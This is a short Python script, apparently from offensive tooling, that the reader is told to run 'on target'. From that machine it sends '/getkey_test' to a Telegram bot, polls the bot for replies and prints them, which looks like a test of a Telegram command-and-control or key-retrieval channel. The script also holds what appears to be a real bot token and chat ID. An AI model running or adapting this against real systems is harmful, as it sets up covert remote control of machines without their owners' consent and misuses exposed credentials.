# Save this as test.py and run it on target
import urllib.request
import json

PAYLOAD_TOKEN = "YOUR_SECOND_BOT_TOKEN_HERE"
CHAT_ID = 5203456803  # Your chat ID

# Send the request
url = f"https://api.telegram.org/bot8656129474:AAFjMhWj8W3OgzzfOzQ5Zi30ZC9HOSWo0yo/sendMessage"
data = json.dumps({"chat_id": CHAT_ID, "text": "/getkey_test"}).encode()
req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
urllib.request.urlopen(req, timeout=10)

# Poll for replies
url = f"https://api.telegram.org/bot8656129474:AAFjMhWj8W3OgzzfOzQ5Zi30ZC9HOSWo0yo/getUpdates?limit=50"
req = urllib.request.Request(url)
resp = urllib.request.urlopen(req, timeout=10)
data = json.loads(resp.read().decode())

print(json.dumps(data, indent=2))